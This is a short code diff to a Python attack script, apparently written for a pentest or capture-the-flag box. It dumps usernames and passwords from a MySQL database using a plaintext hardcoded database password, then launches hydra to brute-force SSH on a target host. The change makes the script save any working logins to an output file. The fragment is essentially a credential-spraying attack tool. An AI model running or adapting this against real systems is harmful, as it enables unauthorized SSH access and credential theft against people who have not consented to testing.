@@ -12,6 +12,7 @@ DBPASS = 'UcVQCMQk2STVeS6J'
 WDIR=str(Path.cwd())
 USER_FILE = WDIR + "/out/user.txt"
 PASS_FILE = WDIR + "/out/pass.txt"
+LOGINS_FILE = WDIR + "/out/logins.txt"
 
 
 
@@ -64,7 +65,7 @@ def main():
     mysql_select(user_file, pass_file)
     user_file.close()
     pass_file.close()
-    cmd_hydra = '/usr/bin/hydra -L {} -P {} ssh://{}'.format(USER_FILE, PASS_FILE, HOST)
+    cmd_hydra = '/usr/bin/hydra -L {} -P {} -o {} ssh://{}'.format(USER_FILE, PASS_FILE, LOGINS_FILE, HOST)
     os.system(cmd_hydra)
 
 if __name__ == "__main__":
